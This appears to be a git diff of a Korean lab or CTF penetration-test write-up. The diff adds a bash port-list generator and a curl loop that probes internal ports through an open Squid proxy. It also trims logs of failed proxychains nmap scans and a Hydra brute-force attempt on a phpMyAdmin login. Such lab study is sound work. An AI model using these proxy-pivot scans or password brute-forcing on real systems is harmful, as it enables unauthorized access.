@@ -201,6 +201,8 @@ SquidGuard 1.x - NULL URL Character Unauthorized Access | linux/remote/23848.txt
 ```bash
 curl -x http://192.168.112.189:3128 192.168.112.189
 curl -x http://192.168.112.189:3128 http://192.168.112.189
+
+curl -v --socks4 192.168.112.189:3128 http://192.168.112.189
 ```
 
 ```text
@@ -256,149 +258,66 @@ Released for free under a Creative Commons Attribution 2.5 License
 </body></html>
 ```
 
-## 4. proxychains
+## 4. proxychains (실패 기록)
 
 - /etc/proxychains.cfg 변경
+- squid 는 socks 핸드쉐이크 미지원으로 http 프로토콜 설정
 
 ```text
 [ProxyList]
 http 192.168.112.189 3128
 ```
 
-- 프록시 활용한 내부 스캔
-- 프록시 체인이 TPC만 지원하므로 -sT 명시
+## 추후 다시 교정
+
+- TCP스캐닝을 위해 스크립트 작성
 
 ```bash
-proxychains nmap -sT -p- -Pn 192.168.112.189
-proxychains nmap -sT -sV -sC -p- --open -Pn -oN proxy_scan.txt 192.168.112.189
+#!/bin/bash
+# generate_port.sh — 스캔용 포트 목록 txt 생성
+# 사용법:
+#   ./generate_port.sh            → 빈도 top 1000
+#   ./generate_port.sh 100        → 빈도 top 100
+#   ./generate_port.sh 1-65535    → 범위 전체
+
+out=/tmp/ports_to_check.txt
+arg="${1:-1000}"
+
+if [[ "$arg" =~ ^[0-9]+$ ]]; then
+    # top N: nmap-services DB 빈도순 (중요 포트부터 스캔됨), 스캔 없음
+    awk -F'\t' '$2 ~ /\/tcp$/ && $3 != "" {p=$2; sub(/\/tcp$/,"",p); print $3, p}' /usr/share/nmap/services \
+        | sort -rn | head -n "$arg" > "$out.tmp"
+    awk '{print $2}' "$out.tmp" > "$out"; rm -f "$out.tmp"
+elif [[ "$arg" =~ ^[0-9]+-[0-9]+$ ]]; then
+    seq "${arg%-*}" "${arg#*-}" > "$out"
+else
+    echo "사용법: $0 [top N | 시작-끝]   예) $0 100 | $0 1000 | $0 1-65535" >&2
+    exit 1
+fi
+
+[[ -s "$out" ]] || { echo "[!] 빈 결과 — $out" >&2; exit 1; }
+cat "$out"
+echo "[*] $(wc -l < "$out") ports -> $out" >&2
+
 ```
-
-```text
-┌──(root㉿docker-desktop)-[/]
-└─# proxychains nmap -sV -sC -p- --open -Pn -oN proxy_scan.txt 192.168.112.189
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.17
-[proxychains] DLL init: proxychains-ng 4.17
-[proxychains] DLL init: proxychains-ng 4.17
-[proxychains] DLL init: proxychains-ng 4.17
-Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-19 08:42 +0000
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:135 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:139 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:49666 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:49667 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:39458 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:7587 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:49667 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:49666 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:135 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:139 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:49666 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:135 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:139 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:3128 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:49667 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 192.168.112.189:445 <--socket error or timeout!
-Nmap scan report for 192.168.112.189
-Host is up (0.097s latency).
-Not shown: 65529 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT STATE SERVICE VERSION
-135/tcp open tcpwrapped
-139/tcp open tcpwrapped
-445/tcp open tcpwrapped
-3128/tcp open tcpwrapped
-49666/tcp open tcpwrapped
-49667/tcp open tcpwrapped
-
-Host script results:
-|_smb2-security-mode: SMB: Failed to connect to host: ERROR
-|_smb2-time: ERROR: Script execution failed (use -d to debug)
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 734.75 seconds
-```
-
-- 다를게 없어서 내부로 바꿔서 다시
 
 ```bash
-proxychains nmap -sT -p- --open -Pn 127.0.0.1
-```
+# Define a base URL, which is the proxy address minus the proxy port
+base_url='http://192.168.112.189'
+# Define the proxy URL, which is the base URL plus the proxy port
+proxy_url="$base_url:3128"
 
-```text
-┌──(root㉿docker-desktop)-[/]
-└─# proxychains nmap -sT -p- --open -Pn 127.0.0.1
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.17
-[proxychains] DLL init: proxychains-ng 4.17
-[proxychains] DLL init: proxychains-ng 4.17
-Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-19 08:56 +0000
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:3306 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:1025 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:256 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:22 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:443 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:8888 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:8080 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:995 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:445 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:199 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:25 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:113 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:587 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:5900 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:111 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:993 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:1720 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:21 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:139 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:135 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:3389 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:23 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:53 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:554 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:143 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:110 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:1723 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:80 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:22370 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:20610 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:31099 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:32076 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:39696 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:3640 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:15877 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:10693 <--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:51762
-```
+for port in $(cat /tmp/ports_to_check.txt) ; do \
+    # Create a test URL string, which is the base URL plus the test port
+    echo "$port executing..."
+    test_url="$base_url:$port"
+    # If we don't find the string `ERROR` the port may be open
+    if ! curl -skL --proxy $proxy_url $test_url | grep ERROR > /dev/null ; then \
+        echo "$test_url may be open behind the proxy" ; \
+    fi ; \
 
-- proxychains http 127.0.0.1:8080
-- 프록시 체인으로 스캐닝 이후 직접 접근
-
-```text
-┌──(root㉿docker-desktop)-[/]
-└─# proxychains http 127.0.0.1:80
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.17
-[proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:80 <--socket error or timeout!
-
-http: error: ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: / (Caused by NewConnectionError("HTTPConnection(host='127.0.0.1', port=80): Failed to establish a new connection: [Errno 111] Connection refused")) while doing a GET request to URL: http://127.0.0.1:80/
+    echo "$port ended"
+done
 ```
 
 ## 5. 내부 웹
@@ -1034,31 +953,9 @@ proxychains4 hydra -L top-usernames-shortlist.txt -P ../Passwords/Most-Popular-L
 ```
 
 ```text
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.17
-Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:57:25
 [DATA] max 4 tasks per 1 server, overall 4 tasks, 809251 login tries (l:17/p:47603), ~202313 tries per task
-[DATA] attacking http-post-form://127.0.0.1:8080/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=216a2f757c755648564f4c6478424b54
-216a2f757c755648564f4c6478424b54:C=/phpmyadmin/index.php:2=:F=CSRF
-[proxychains] Strict chain ... 192.168.112.189:3128 [proxychains] Strict chain ... 192.168.112.189:3128 [proxychains] Strict chain ... 192.168.112.189:3128 [proxychains] Strict chain ... 192.168.112.189:3128 [ATTEMPT] target 127.0.0.1 - login "root" - pass ""spring" - 1 of 809251 [child 0] (0/0)
-[ATTEMPT] target 127.0.0.1 - login "root" - pass "'buster+'" - 2 of 809251 [child 1] (0/0)
-[ATTEMPT] target 127.0.0.1 - login "root" - pass "++++" - 3 of 809251 [child 2] (0/0)
-[ATTEMPT] target 127.0.0.1 - login "root" - pass "+monday" - 4 of 809251 [child 3] (0/0)
-... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 <--socket error or timeout!
-<--socket error or timeout!
-<--socket error or timeout!
-<--socket error or timeout!
-[proxychains] Strict chain ... 192.168.112.189:3128 [proxychains] Strict chain ... 192.168.112.189:3128 [proxychains] Strict chain ... 192.168.112.189:3128 [proxychains] Strict chain ... 192.168.112.189:3128 ... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 <--socket error or timeout!
-[ERROR] Child with pid 8312 terminating, cannot connect
-<--socket error or timeout!
-[ERROR] Child with pid 8314 terminating, cannot connect
-<--socket error or timeout!
-<--socket error or timeout!
-[ERROR] Child with pid 8315 terminating, cannot connect
-[ERROR] Child with pid 8313 terminating, cannot connect
+[ATTEMPT] target 127.0.0.1 - login "root" - pass ""spring" - 1 of 809251 [child 0] (0/0)
+... (proxychains 소켓 오류 노이즈로 전부 실패)
 [ERROR] all children were disabled due too many connection errors
 0 of 1 target completed, 0 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-19 09:57:58
